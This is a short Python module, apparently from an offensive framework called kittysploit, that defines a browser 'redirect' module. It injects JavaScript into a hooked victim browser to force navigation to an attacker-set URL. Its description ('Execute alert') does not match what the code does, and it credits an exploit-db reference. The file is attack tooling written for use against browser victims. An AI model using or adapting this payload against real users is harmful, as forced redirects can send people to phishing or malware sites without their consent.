from kittysploit import *

class Module(BrowserAuxiliary):

	__info__ = {
		"name": "redirect",
		"description": "Execute alert on browser victim",
		"authors": (
			"Yakir Wizman",  # vulnerability discovery
			"Marcin Bury <marcin[at]threat9.com>",  # routersploit module
		),
		"references": (
			"https://www.exploit-db.com/exploits/40284/",
		),
		"target": (
			"all",
		),
	}	
	
	website = OptString("http://www.google.com", "Redirection destination", "yes")

	def run(self):
		self.send_js(f"window.location.replace('{self.website}');")
